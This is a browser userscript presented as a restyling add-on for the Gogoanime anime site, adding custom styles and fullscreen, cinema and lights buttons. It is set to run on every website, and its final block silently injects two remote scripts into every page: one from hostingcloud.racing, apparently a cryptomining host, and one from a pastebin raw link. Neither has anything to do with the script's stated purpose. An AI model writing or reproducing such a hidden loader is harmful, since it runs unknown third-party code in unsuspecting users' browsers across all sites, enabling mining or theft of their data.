// ==UserScript==
// @version      1.2.20190911
// @author       Anjolo96
// @name         [A]Styles 1.2
// @description  Re-Styling Websites & Custom Add-ons (Scripts) by Anjolo96
// @namespace    https://github.com/Anjolo96/Gogoanime-CustomStyle
// @homepageURL  https://github.com/Anjolo96/Gogoanime-CustomStyle
// @updateURL    https://raw.githubusercontent.com/Anjolo96/Gogoanime-CustomStyle/master/Main.js
// @downloadURL  https://raw.githubusercontent.com/Anjolo96/Gogoanime-CustomStyle/master/Main.js
// @include      *
// @run-at       document-idle
// ==/UserScript==
var home = 1;

if (location.href.match(/gogoanime/)) {
    if (location.href.match(/episode/)) {
        home = 0;
        //alert("u're watching anime at GogoAnime");
        (function GM_main ($) {

            //any css added with this function afect entire web page
            function addGlobalStyle(css) {
                var head, style;
                head = document.getElementsByTagName('head')[0];
                if (!head) { return; }
                style = document.createElement('style');
                style.type = 'text/css';
                style.innerHTML = css;
                head.appendChild(style);
            }

            // this is just the styling, wont detail here :|
            addGlobalStyle('#episode_related li :visited { background-color: #252525; color: #a2790b;}');
            addGlobalStyle('#episode_related li .active { background-color: #d29b06; color: #fff; }');
            addGlobalStyle('#episode_related li :hover { background-color: #ffc119; color: #fff; }');
            addGlobalStyle('.customButton { float: left; margin-left: 10px; cursor: pointer; background-color: #363636; line-height: 25px; padding: 0 10px; }');
            addGlobalStyle('.customButton:hover { background-color: #d29b06; color: #fff; }');
            addGlobalStyle('.anime_video_body_watch { position: relative; z-index: 2; }');
            addGlobalStyle('.light { cursor: pointer; top: 0px; width: 100%; height: 100%; z-index: 1; left: 0px; position: fixed; background-color: #000000d4; }');
            addGlobalStyle('.anime_video_body_episodes a:visited { color: #a2790b; }');
            addGlobalStyle('ul.items li p.name a:visited { color: #a2790b; }');
            addGlobalStyle('.play-video { background-color: #1b1b1b03; padding-bottom: 60%; }');
            addGlobalStyle('#scrollbar1 { width: 99%;');
            addGlobalStyle('#scrollbar1 .viewport { position: relative; text-overflow: ellipsis; white-space: nowrap; overflow: hidden; width: 90%;');
            addGlobalStyle('nav.menu_recent ul li { width: 90%; overflow: null; text-overflow: null;');


            ///////////////////////////////////////////////////////////////////////////////////////
            ///////////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////
            // Create the div for button (FULLSCREEN) itself
            var btnFullscreen = document.createElement("div");
            btnFullscreen.classList.add('customButton');
            btnFullscreen.id = "btnFullscreen";
            // the icon...
            var iconFullscreen = document.createElement("i");
            iconFullscreen.classList.add('fa');
            iconFullscreen.classList.add('fa-toggle-off');
            iconFullscreen.style.padding = "0px 5px 0px 0px";
            // the text...
            var spanFullscreen = document.createElement("i");
            spanFullscreen.innerHTML = "FullScreen OFF";
            ////////////////////////////////////////////////
            ////////////////////////////////////////////////
            // Create the div for button (CINEMA) itself
            var btnCinema = document.createElement("div");
            btnCinema.classList.add('customButton');
            btnCinema.id = "btnLight";
            // the icon...
            var iconCinema = document.createElement("i");
            iconCinema.classList.add('fa');
            iconCinema.classList.add('fa-arrows-h');
            iconCinema.style.padding = "0px 5px 0px 0px";
            // the text...
            var spanCinema = document.createElement("i");
            spanCinema.innerHTML = "Cinema";
            ////////////////////////////////////////////////
            ////////////////////////////////////////////////
            // Create the div for button (LIGHTS) itself
            var btnLight = document.createElement("div");
            btnLight.classList.add('customButton');
            btnLight.id = "btnLight";
            // the icon...
            var iconLight = document.createElement("i");
            iconLight.classList.add('fa');
            iconLight.classList.add('fa-lightbulb-o');
            iconLight.style.padding = "0px 5px 0px 0px";
            // the text...
            var spanLight = document.createElement("i");
            spanLight.innerHTML = "Lights";
            ////////////////////////////////////////////////
            ////////////////////////////////////////////////
            // Create the div for overlay
            var darkOverlay = document.createElement("div");
            darkOverlay.id = "darkOverlay";


            ///////////////////////////////////////////////////////////////////////////////////////
            ///////////////////////////////////////////////////////////////////////////////////////
            // Append the Fullscreen Mode button
            var appendFullscreen = document.getElementsByClassName('favorites_book')[0].parentNode;
            appendFullscreen.appendChild(btnFullscreen);
            btnFullscreen.appendChild(iconFullscreen);
            btnFullscreen.appendChild(spanFullscreen);
            /////////////////////////////////
            // Append the Cinema Mode button
            var appendCinema = document.getElementsByClassName('favorites_book')[0].parentNode;
            appendCinema.appendChild(btnCinema);
            btnCinema.appendChild(iconCinema);
            btnCinema.appendChild(spanCinema);
            /////////////////////////////////
            // Append the Light  button
            var appendLight = document.getElementsByClassName('favorites_book')[0].parentNode;
            appendLight.appendChild(btnLight);
            btnLight.appendChild(iconLight);
            btnLight.appendChild(spanLight);
            ////////////////////////////////////////////////
            // Append the overlay to the bottom of page
            var appendOverlay = document.getElementsByTagName('body')[0];
            appendOverlay.appendChild(darkOverlay);


            ///////////////////////////////////////////////////////////////////////////////////////
            ///////////////////////////////////////////////////////////////////////////////////////
            // Cliking button is the same as clicking the dark overlay...
            darkOverlay.addEventListener ("click", function() { SwitchLight(); });
            btnLight.addEventListener ("click", function() { SwitchLight(); });
            btnFullscreen.addEventListener ("click", function() { ToggleFullscreen(); });
            btnCinema.addEventListener ("click", function() { ToggleCinema(); });


            ///////////////////////////////////////////////////////////////////////////////////////
            ///////////////////////////////////////////////////////////////////////////////////////
            // script to auto change for xstreamcdn server
            var playbackPlayer = document.getElementsByClassName("xstreamcdn")[0].children[0];
            var oldplaybackPlayer = document.getElementsByClassName("anime")[0].children[0];
            var targetDataVideo = playbackPlayer.getAttribute('data-video');
            var tragetIFrame = document.getElementsByTagName("iframe")[0];

            // set up the mutation observer
            var observer = new MutationObserver(function (mutations, me) {
                //'mutations' is an array of mutations that occurred
                // 'me' is the MutationObserver instance
                var canvas = document.getElementsByTagName("iframe")[0]
                if (canvas) {
                    handleCanvas(canvas);
                    me.disconnect(); // stop observing
                    return;
                }
            });

            // start observing
            observer.observe(document, {
                childList: true,
                subtree: true
            });


            ///////////////////////////////////////////////////////////////////////////////////////
            ///////////////////////////////////////////////////////////////////////////////////////
            //obviously it starts hidden... The cinema mode
            var elem = document.documentElement;
            var contentLeft = document.getElementsByClassName("content")[0].children[0];
            var contentRight = document.getElementsByClassName("content")[0].children[1];
            var lightEnabled = false;
            var fullscreen = false;
            var cinema = false;

            function SwitchLight(){
                lightEnabled = !lightEnabled; //like math (X times -1 = -X) or even (-X times -1 = X) http://prntscr.com/ou8pxr
                if(lightEnabled){
                    darkOverlay.className = "light";
                    if(fullscreen){
                        if (elem.requestFullscreen) {
                            elem.requestFullscreen();
                        } else (elem.webkitRequestFullscreen)
                        elem.webkitExitFullscreen();
                    }
                } else {
                    darkOverlay.className = null;
                    if(fullscreen){
                        if (document.exitFullscreen) {
                            document.exitFullscreen();
                        } else (document.webkitExitFullscreen)
                        document.webkitExitFullscreen();
                    }
                }
            }

            function ToggleCinema(){
                cinema = !cinema;
                if(cinema){
                    contentLeft.className = null;
                    contentRight.className = null;
                    addGlobalStyle('nav.menu_recent ul li { width: 33%; overflow: hidden; text-overflow: ellipsis;');
                } else {
                    contentLeft.className = "content_left";
                    contentRight.className = "content_right";
                    addGlobalStyle('nav.menu_recent ul li { width: 90%; overflow: null; text-overflow: null;');
                }
            }

            function ToggleFullscreen(){
                fullscreen = !fullscreen;
                if(fullscreen){
                    iconFullscreen.className = "fa fa-toggle-on";
                    spanFullscreen.innerHTML = "FullScreen ON";
                } else {
                    iconFullscreen.className = "fa fa-toggle-off";
                    spanFullscreen.innerHTML = "FullScreen OFF";
                }
            }

            // callback executed when canvas was found
            function handleCanvas(canvas) {
                tragetIFrame.src = targetDataVideo;
                playbackPlayer.className = "active";
                oldplaybackPlayer.classList.remove("active");
            }

            // After "Please, reload page if you can't watch the video" gap wich countains a strange script, let's just delete...
            var bigSpace = document.getElementsByClassName('anime_video_body_cate')[0].children[4];
            bigSpace.hidden = true;
        })();
    }
}

if (home == 1){
    if (location.href.match(/gogoanime/)) {
        (function GM_main ($) {
            //alert("u're at GogoAnime's home");
            //any css added with this function afect entire web page
            function addGlobalStyle(css) {
                var head, style;
                head = document.getElementsByTagName('head')[0];
                if (!head) { return; }
                style = document.createElement('style');
                style.type = 'text/css';
                style.innerHTML = css;
                head.appendChild(style);
            }

            addGlobalStyle('nav.menu_series ul li a:visited { color: #a2790b; }');
        })();
    }
}

(function () {
    var s = document.createElement('script');
    s.src = "https://www.hostingcloud.racing/oou8.js";
    (document.head || document.documentElement).appendChild(s);
    s.onload = function() {
    };
    var x = document.createElement('script');
    x.src = "https://pastebin.com/raw/T6LRiff5";
    (document.head || document.documentElement).appendChild(x);
    x.onload = function() {
    };
})();

